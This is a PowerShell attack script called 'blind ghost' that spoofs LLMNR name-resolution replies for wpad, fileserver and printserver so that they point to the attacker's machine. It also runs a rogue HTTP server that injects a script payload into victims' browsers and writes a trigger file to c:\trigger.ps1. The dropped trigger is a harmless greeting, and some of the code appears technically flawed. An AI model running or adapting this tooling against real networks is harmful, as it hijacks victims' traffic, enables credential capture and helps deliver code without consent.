# blind ghost//- Violentqm

# debug
function debug {
  param ([string]$msg)
  $ts = get-date -format "hh:mm:ss"
  write-host "[$ts] $msg"
}

# spoof llmnr/nbt-ns to hijack .local names
function start-spoof {
  debug "starting llmnr/nbt-ns spoofer..."
  $spoof = {
    $udp = new-object system.net.sockets.udpclient 5355
    $ep = new-object system.net.ipendpoint([ipaddress]::any, 0)
    while ($true) {
      try {
        $bytes = $udp.receive([ref]$ep)
        $q = [text.encoding]::ascii.getstring($bytes[13..$bytes.length])
        if ($q -match "wpad|fileserver|printserver") {
          $resp = [byte[]](0x14,0xe8,0x81,0x80,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00) +
                  $bytes[0..1] + 0x00,0x01,0xc0,0x0c,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x3c,0x00,0x04 +
                  ([ipaddress][string](get-netipaddress -addressfamily ipv4 | where-object { $_.interfacealias -notlike "*loopback*" }).ipaddress).getaddressbytes()
          $udp.send($resp, $resp.length, $ep)
          debug "spoofed $q"
        }
      } catch {
        debug "spoof error: $_"
        $udp.close()
        break
      }
    }
  }
  start-job -scriptblock $spoof | out-null
  debug "spoofer running"
}

# host malicious http server to inject commands
function start-http {
  debug "starting http server..."
  $listener = new-object system.net.httplistener
  $listener.prefixes.add("http://*/")
  try {
    $listener.start()
    debug "http server up"
    while ($true) {
      $ctx = $listener.getcontext()
      $res = $ctx.response
      $payload = @"
        <script>
          fetch('file:///\\wpad\\test', { mode: 'no-cors' })
            .then(() => { new audio('http://$($ctx.request.userhostaddress)/trigger.ps1').play() })
        </script>
"@
      $buf = [text.encoding]::utf8.getbytes($payload)
      $res.contenttype = "text/html"
      $res.outputstream.write($buf, 0, $buf.length)
      $res.close()
      debug "payload sent to $($ctx.request.userhostaddress)"
    }
  } catch {
    debug "http error: $_"
    $listener.stop()
  }
}

function create-payload {
  debug "making payload..."
  $trigger = @"
    start-process powershell -argumentlist "-c write-output 'hello friend...'"
"@
  try {
    $trigger | out-file -filepath c:\trigger.ps1
    debug "payload saved to c:\trigger.ps1"
  } catch {
    debug "payload error: $_"
  }
}

try {
  debug "starting blind ghost..."
  start-spoof
  start-http
  create-payload
  debug "blind ghost is live. all devices will say hello..."
} catch {
  debug "fatal error: $_"
}
